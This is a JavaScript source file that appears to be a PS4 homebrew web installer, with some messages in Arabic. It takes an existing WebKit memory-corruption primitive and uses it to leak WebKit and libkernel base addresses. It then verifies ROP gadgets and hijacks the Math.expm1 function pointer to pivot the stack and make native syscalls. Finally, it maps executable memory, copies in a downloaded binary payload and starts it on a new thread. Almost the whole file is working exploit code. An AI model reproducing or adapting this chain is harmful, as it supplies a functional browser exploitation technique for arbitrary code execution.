// BELOGAME Web Installer test
// Userland/WebKit loader only. It does NOT run the kernel exploit again.
// Requirement: GoldHEN/Mira must already be active.

import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const stateEl = document.getElementById("state");
const logEl = document.getElementById("log");
const lines = [];
const keepAlive = [];

function state(t, cls) {
    stateEl.textContent = t;
    stateEl.className = cls || "";
}
function log(t) {
    lines.push(String(t));
    logEl.textContent = lines.join("\n");
    logEl.scrollTop = logEl.scrollHeight;
}
function ok(t) { log("[OK] " + t); }
function warn(t) { log("[WARN] " + t); }
function fail(t) { log("[FAIL] " + t); state(t, "bad"); }

const SYS = {
    getpid: 20,
    getuid: 24,
    mmap: 0x1dd
};

const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

(async function () {
    let p = null;
    let mainMf = null;
    let mainOrig = null;
    let mainArmed = false;

    try {
        const { key, off } = offsetsFor(navigator.userAgent);
        log("Firmware: " + (key || "unknown"));
        if (!off) {
            fail("هذا الفيرموير غير موجود في ps4_offsets.js");
            return;
        }

        state("تحميل Installer...", "warn");
        const response = await fetch("./online-store-installer.bin?v=1", { cache: "no-store" });
        if (!response.ok) throw new Error("installer fetch HTTP " + response.status);
        const payload = new Uint8Array(await response.arrayBuffer());
        ok("Installer loaded: " + payload.length + " bytes");
        if (payload.length < 16) throw new Error("installer file too small");

        state("تشغيل WebKit loader...", "warn");
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: function (tag, detail) {
                if (/FAIL|ERROR|THREW|RETRY|ABORT|PASS/i.test(tag))
                    log(tag + (detail ? "  " + detail : ""));
            }
        });

        installWindowP(carrier, {
            promote: false,
            onEvent: function (tag, detail) {
                if (/FAIL|ERROR|THREW|PASS/i.test(tag))
                    log(tag + (detail ? "  " + detail : ""));
            }
        });

        if (!window.p) throw new Error("memory primitive was not installed");
        p = window.p;
        ok("WebKit primitive ready (" + pairStatus.state + ")");

        // Resolve WebKit + libkernel bases exactly like the working Poops chain,
        // but stop here: no kernel UAF / no kernel exploit is executed.
        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        ok("Module bases resolved");

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]]
        ];

        for (const item of GAD) {
            const nm = item[0], rva = item[1], pat = item[2];
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (!good) throw new Error("bad gadget: " + nm);
            G[nm] = a;
        }
        ok("ROP gadgets verified");

        const stubAddr = new Map();
        const required = [SYS.getpid, SYS.getuid, SYS.mmap];

        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr;
                if (required.indexOf(num) === -1) continue;
                const o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                const baked = (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0);
                if (baked !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o));
            }
        }

        const need = new Set(required.filter(function (n) { return !stubAddr.has(n); }));
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o));
            need.delete(num);
        }
        if (need.size) throw new Error("missing syscall stubs: " + Array.from(need).join(","));
        ok("Required syscall stubs found");

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
                .add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }

        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);

        function makeCtx() {
            const sb = new ArrayBuffer(0x20);
            const pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000);
            const fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = {
                storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb)
            };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb); c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }

        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }

        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;

        function callAddr(target, args) {
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return {
                lo: M.frameDv.getUint32(0, true),
                hi: M.frameDv.getUint32(4, true),
                i32: M.frameDv.getUint32(0, true) | 0
            };
        }
        function sc(num) {
            const args = Array.prototype.slice.call(arguments, 1);
            return callAddr(stubAddr.get(num), args);
        }

        const pid = sc(SYS.getpid).i32;
        const uid = sc(SYS.getuid).i32;
        ok("Native calls ready: pid=" + pid + " uid=" + uid);

        // GoldHEN/HEN is expected to have enabled executable anonymous mappings.
        const sz = (payload.length + 0x3fff) & ~0x3fff;
        const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
        const entry = new int64(m.lo, m.hi);
        if (entry.hi <= 0 || entry.hi >= 0xffff0000) {
            throw new Error("RWX mmap failed. شغّل GoldHEN أولاً ثم افتح install.html");
        }
        ok("RWX payload memory allocated");

        for (let i = 0; i < payload.length; ++i) p.write1(entry.add32(i), payload[i]);
        let bad = -1;
        for (let i = 0; i < payload.length; ++i) {
            if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
        }
        if (bad >= 0) throw new Error("payload copy mismatch at " + bad);
        ok("Installer copied to executable memory");

        if (off.wk___imp_pthread_create === undefined || off.k_pthread_create === undefined)
            throw new Error("pthread_create offsets missing for this firmware");

        const slot = webkitBase.add32(off.wk___imp_pthread_create);
        const pthreadCreate = p.read8(slot);
        const expected = libkernelBase.add32(off.k_pthread_create);
        if (pthreadCreate.low !== expected.low || pthreadCreate.hi !== expected.hi)
            throw new Error("pthread_create pointer mismatch");

        const thr = new ArrayBuffer(8);
        keepAlive.push(thr);
        const thrAddr = bufAddr(thr);
        new Uint8Array(thr).fill(0);

        state("تشغيل Store Installer...", "warn");
        const rc = callAddr(pthreadCreate, [thrAddr, 0, entry, 0]).i32;
        if (rc !== 0) throw new Error("pthread_create failed rc=" + rc);

        ok("Installer thread launched");
        state("تم تشغيل المثبّت — راقب إشعارات PS4", "ok");
        log("إذا كان الـInstaller متوافقاً، المفروض يظهر إشعار Starting to download ثم يبدأ Store-R2.pkg.");

    } catch (e) {
        fail((e && e.message) ? e.message : String(e));
    } finally {
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
            }
        } catch (e) {}
    }
})();
